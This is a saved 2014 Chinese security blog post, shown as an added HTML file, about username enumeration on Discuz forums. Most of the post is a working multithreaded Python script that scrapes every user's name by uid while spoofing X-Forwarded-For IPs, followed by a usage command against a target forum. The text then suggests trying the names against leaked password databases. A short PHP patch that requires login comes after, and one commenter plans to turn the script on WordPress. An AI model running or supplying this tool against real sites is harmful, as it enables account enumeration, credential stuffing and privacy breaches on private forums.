@@ -1,0 +1,381 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./Discuz the user traversal Poc  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./Discuz the user traversal Poc  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./Discuz the user traversal Poc  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>Discuz the user traversal Poc | 离别歌</title>
+<link href="./Discuz the user traversal Poc  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/styles.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/style.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./Discuz the user traversal Poc  离别歌/jquery.min.js"></script>
+<link href="./Discuz the user traversal Poc  离别歌/code.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/button.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./Discuz the user traversal Poc  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;text=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;title=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;is_video=false&amp;description=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=Discuz%20the%20user%20traversal%20Poc&amp;body=Check out this article: https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;title=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;title=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;title=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;title=Discuz%20the%20user%20traversal%20Poc"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PYTHON/discuz-user-traversal-poc.html&amp;name=Discuz%20the%20user%20traversal%20Poc&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">Discuz the user traversal Poc</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年1月26日 10:07" itemprop="datePublished">
+                    2014 一月 26 10:07
+                </time>
+</div>
+<div class="article-tag">
+            阅读：12265
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PYTHON">Python</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/discuz">discuz</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+<br>
+</br></p>
+<p>
+<span><span style="font-size:14px;line-height:21px;">看到网上某篇文章，突然想起自己还有几篇没有发到博客上，于是发一下。</span></span>
+</p>
+<p>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x01 从discuz能遍历用户资料的问题谈起</span>
+</p>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">我们随便点进一个discuz论坛，在地址后面加?1，有的论坛就会显示uid=1的用户资料页（或是家园空间首页，取决于这个论坛有没有开通家园）：</span><br>
+ <span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><a href="https://www.leavesongs.com/content/uploadfile/201401/4efd1390738411.jpg" id="ematt:357" target="_blank"><img alt="01.jpg" border="0" height="160" src="./Discuz the user traversal Poc  离别歌/thum-4efd1390738411.jpg" title="点击查看原图" width="420"/></a><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">不过有些论坛（比如法客）没有这个的，可能是哪里修改了。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">不过我们访问 </span><span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">home.php?mod=space&amp;uid=3550&amp;do=profile</span><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"> 还是能看到 uid = 3550的用户资料的：</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201401/3fb51390738412.jpg" id="ematt:359" target="_blank"><img alt="02.jpg" border="0" height="236" src="./Discuz the user traversal Poc  离别歌/thum-3fb51390738412.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">而且，这个地址是没有登录限制的，也就是说未登录的用户也能看这个资料页面。而且好像后台是不能增加这个限制的，必须要改代码。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">这对于一些私密性比较高的论坛就构成了很大的威胁，这个问题就类似于wordpress的用户名遍历问题一样，获得了你的用户名，就能爆破你的密码了。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">于是，我们设想，从uid=1到uid=XXX，写个脚本遍历一下，就能够获得这个论坛所有注册用户的用户名。不管你是不是这个论坛的用户。</span><br/>
+<br/>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x02 python脚本的编写</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">我之前写了一个单线程的，但速度实在不敢恭维，所以后来改成多线程。多线程速度确实快了许多，但涉及到线程同步的问题又让我困惑了好久，最后加了一些线程锁，还有生成随机IP的代码，速度减低了一些但代码能稳定地运行了。
+<pre class="brush: python;auto-links: false;">#!/usr/bin/python
+# -*- coding: utf-8 -*-
+'''
+to get all user on discuz
+get username from http://localhost/home.php?mod=space&amp;uid=1&amp;do=profile
+'''
+__author__ = 'Phtih0n'
+header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 '
+                        '(KHTML, like Gecko) Chrome/29.0.1547.66 Safari/537.36 LBBROWSER'}
+import threading, random
+
+now = 1
+time = 0
+lock = threading.Lock()
+
+class ScanThread(threading.Thread):
+    def __init__(self, url, end_times, fout):
+        threading.Thread.__init__(self)
+        if url[0:7] != "http://":
+            self.url = "http://%s" % url
+        else:
+            self.url = url
+        self.end_times = end_times
+        self.fout = fout
+
+    def run(self):
+        self.scan_username()
+
+    def makeIp(self):
+        return "%d.%d.%d.%d" % (random.randint(11, 190), random.randint(11, 190), random.randint(11, 190), random.randint(11, 190))
+
+    def scan_username(self):
+        import requests, re, sys
+        global now, time, lock, header
+        rex = re.compile(ur'''&lt;title&gt;(.+)的个人资料.+&lt;/title&gt;''')
+        while lock.acquire() and time &lt; self.end_times:
+            now_id = now
+            now += 1
+            header["X-FORWARDED-FOR"] = self.makeIp()
+            lock.release()
+            get = "%s/home.php?mod=space&amp;uid=%d&amp;do=profile" % (self.url, now_id)
+            try:
+                response = requests.get(get, headers = header)
+            except:
+                print u"在Id = %d 处中断" % now_id
+                continue
+            if response.status_code == 404:
+                print u"地址似乎不能破"
+                return
+            html = response.text
+            ret = rex.search(html)
+            if lock.acquire():
+                if ret:
+                    name = ret.group(1).encode("utf-8")
+                    self.fout.write("id: %d username: %s\n" % (now_id, name))
+                    time = 0
+                    sys.stdout.write("%d%s" % (now_id, "\b" * 5))
+                    sys.stdout.flush()
+                else:
+                    time += 1
+                lock.release()
+        lock.release()
+
+if __name__ == "__main__":
+    import optparse
+    parser = optparse.OptionParser()
+
+    parser.add_option(
+        '-u','--scan-url',
+        dest = 'url',
+        help = u'等待扫号的论坛地址')
+    parser.add_option(
+        '-t','--end-times',
+        type = 'int',dest = 'end_times',default = 100,
+        help = u'发现有多少个账号不存在时停止扫描')
+    parser.add_option(
+        '-o','--output-file',
+        dest = 'file',
+        help = u'扫描结果输出文件')
+    options, args = parser.parse_args()
+    fout = open(options.file, "w")
+    ThreadList = []
+    for i in range(0, 20):
+        t = ScanThread(options.url, options.end_times, fout)
+        ThreadList.append(t)
+    for t in ThreadList:
+        t.start()
+    for t in ThreadList:
+        t.join()</pre>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">大概过程是先创建20个线程并进入线程函数，线程函数里开始遍历uid。使用requests模块get到用户资料页的html，并正则匹配出用户名（从&lt;title&gt;里匹配），有uid不存在时就会有“用户不存在”的提示，这时候就将一个计数变量time自增1。当所有用户遍历完了以后，我们的脚本不知道，仍然在访问不存在的uid，但每访问一个time都会自增1，直到time超过预先定义的一个“end_times”值（默认100）。线程退出。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">退出的时候一定要记得释放线程锁，否则就造成其后的线程得不到lock，导致程序一直阻塞。我之前就是因为这个原因困惑了好久。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">程序的用法：</span><br/>
+</span>
+<p>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"><span style="background-color:#FFFFFF;">首先安装python的requests库</span><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">。我习惯用这个库写网络程序……改不了了。这个库也很方便，推荐大家使用。</span></span>
+</p>
+<p>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"><span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">安装方法：</span><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">pip install requests</span><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">或</span><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">easy_install requests</span><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">windows下直接下载：</span><a href="http://www.python-requests.org/en/latest/user/install/#install" target="_blank">http://www.python-requests.org/en/latest/user/install/#install</a><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">解压后进入目录</span><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">python setup.py install</span><br/>
+<span style="color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:22px;background-color:#F9F9F9;">安装</span></span>
+</p>
+<p>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201401/f9961390738413.jpg" id="ematt:361" target="_blank"><img alt="03.jpg" border="0" height="156" src="./Discuz the user traversal Poc  离别歌/thum-f9961390738413.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">要遍历一个论坛账号，就是这样了：</span><br/>
+</span>
+</p>
+<div class="quote" style="margin:10px 0px;padding:10px 10px 5px 65px;background-color:#F9F9F9;color:#666666;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;">
+<blockquote>
+		discuz.py -u <a href="http://bbs.target.com/" target="_blank">http://bbs.target.com</a> -o target.txt -t 100
+	</blockquote>
+</div>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">剩下的任务就是等待。</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201401/2de41390738413.jpg" id="ematt:363" target="_blank"><img alt="04.jpg" border="0" height="30" src="./Discuz the user traversal Poc  离别歌/thum-2de41390738413.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">结果：</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201401/fac41390738473.jpg" id="ematt:367" target="_blank"><img alt="06.jpg" border="0" height="460" src="./Discuz the user traversal Poc  离别歌/thum-fac41390738473.jpg" title="点击查看原图" width="295"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">获得了这些用户名，就能批量在你的“社工库”里碰撞密码了。进行进一步的信息搜集。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">对于那种私密性的论坛，一旦有一个账号泄露，私密性就彻底消失。</span><br/>
+<br/>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x03 问题解决方案</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">这个问题说好也好解决，说难也难解决。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">我这个解决方案只是对于未注册的用户，不能查看其他用户用户名，但对于注册的用户来说，查看其他人用户名就太简单了。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">来到discuz根目录下的\source\include\space\space_profile.php</span>
+<pre class="brush: php;auto-links: false;">if(!defined('IN_DISCUZ')) {
+        exit('Access Denied');
+}
+
+require_once libfile('function/spacecp');
+
+space_merge($space, 'count');
+space_merge($space, 'field_home');
+space_merge($space, 'field_forum');
+space_merge($space, 'profile');
+space_merge($space, 'status');
+getonlinemember(array($space['uid']));
+
+###########################################
+if($_G['uid'] &gt; 0) {} //in_array($_G['groupid'], array(1))
+else {
+showmessage('对不起，您无权进行此操作');
+}
+###########################################
+
+if($space['videophoto'] &amp;&amp; ckvideophoto($space, 1)) {
+        $space['videophoto'] = getvideophoto($space['videophoto']);
+} else {
+        $space['videophoto'] = '';
+}</pre>
+<br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">以后当未登录的用户再访问/?1或home.php?mod=space&amp;uid=1&amp;do=profile时就会提示“对不起，您无权进行此操作”</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201401/13501390738414.jpg" id="ematt:365" target="_blank"><img alt="05.jpg" border="0" height="157" src="./Discuz the user traversal Poc  离别歌/thum-13501390738414.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<br/>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x04 后话</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">wordpress也能这么遍历出所有用户名，这个总所周知了，把我的脚本改一改就能打wordpress了。</span><br/>
+<p>
+<br/>
+</p>
+</br></div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1867">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Discuz the user traversal Poc  离别歌/04c61490cdcf3272f66ec6a3644e8ffb.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">shuta</a>
+<time datetime="2014年11月26日 14:32" itemprop="datePublished">
+                            2014 十一月 26 14:32
+                        </time>
+<a href="javascript:reply_to('1867', 'shuta')">回复</a>
+</p>
+<p class="comment-meta">我也用了这个脚本线程部分的处理。但是去掉了你的随机ip这一环。用20个线程跑1000多个数据，跑到300多个数据时，发送的HTTP请求就会中断，这是为什么？</p>
+</div>
+</div>
+<div class="row" id="comment-1700">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Discuz the user traversal Poc  离别歌/744fc6f68ad74a1a6ebfc554f8ba0d13.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://startend.net" target="_blank">Str0ng</a>
+<time datetime="2014年6月26日 02:15" itemprop="datePublished">
+                            2014 六月 26 02:15
+                        </time>
+<a href="javascript:reply_to('1700', 'Str0ng')">回复</a>
+</p>
+<p class="comment-meta">马克,这个好晚上回家就改成wp的 爆起来</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="637ab5bd44eefdf00c08c7d438eeb40d42645bc6"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./Discuz the user traversal Poc  离别歌/637ab5bd44eefdf00c08c7d438eeb40d42645bc6"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="299">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="PZHMykgXYsOuDNgksZSogMgqYb4owOmGnj2imOscpfITDsEzggm8Pqiv7fxwfibQ"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./Discuz the user traversal Poc  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./Discuz the user traversal Poc  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
